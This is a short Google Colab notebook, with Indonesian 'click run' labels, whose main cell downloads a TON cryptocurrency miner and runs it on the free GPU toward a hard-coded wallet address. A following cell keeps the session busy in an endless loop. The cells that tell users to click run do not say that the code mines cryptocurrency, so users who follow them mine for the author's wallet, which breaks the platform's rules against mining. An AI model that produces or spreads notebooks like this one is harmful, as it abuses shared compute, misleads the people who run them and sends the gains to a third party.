{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "rev.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4cbgwZWWfWpp"
      },
      "source": [
        "# **Halo sob..., Good Luck!** "
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "tAb77yZ9fzMG"
      },
      "source": [
        "#@title <--  Klik run & tunggu hasilnya seperti gambar diatas\n",
        "!nvidia-smi "
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "! wget https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz && tar -xvf ton-pool.com-miner-0.3.4-linux.tar.gz && ./miner-linux https://next.ton-pool.com EQCFTHZGJa6FNKqehL61BU5zDanLALouErQ0J4XrF-zoNyBk\n"
      ],
      "metadata": {
        "id": "E7v22lCVyeZN"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "p_eyXn9-3iou"
      },
      "source": [
        "#@title <---  Klik run\n",
        "while True:pass\n",
        "time.sleep(9223372036.854775)\n",
        "print ('Congratulation!!')"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "sVQlB8bs9Amt"
      },
      "source": [
        "https://t.me/idrx_0"
      ]
    }
  ]
}